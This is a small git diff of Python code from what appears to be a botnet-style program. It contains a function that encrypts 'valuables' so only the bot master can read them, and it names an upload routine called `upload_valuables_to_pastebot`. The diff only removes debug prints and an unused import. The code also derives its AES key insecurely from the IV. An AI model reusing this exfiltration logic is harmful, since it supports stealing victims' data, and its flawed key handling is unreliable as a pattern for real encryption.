@@ -1,6 +1,5 @@
 import os
 from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_v1_5
 from Crypto.Signature import PKCS1_PSS
 from Crypto.Hash import SHA256
 from Crypto import Random
@@ -30,14 +29,11 @@ def encrypt_for_master(data):
     # RSA(iv) + AES(file) + digest
 
     iv = Random.get_random_bytes(AES.block_size)
-    print(iv)
     aes_encrypted_data = AES.new(str(iv)[:16], AES.MODE_CBC, iv).encrypt(ANSI_X923_pad(data, AES.block_size))
 
     rsa_encrypted_iv = masters_public_key.encrypt(iv, "")[0]
-    print(len(rsa_encrypted_iv))
 
     return rsa_encrypted_iv + aes_encrypted_data + hashed_data;
-    # return rsa_encrypted_iv + aes_encrypted_data + hashed_data;
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
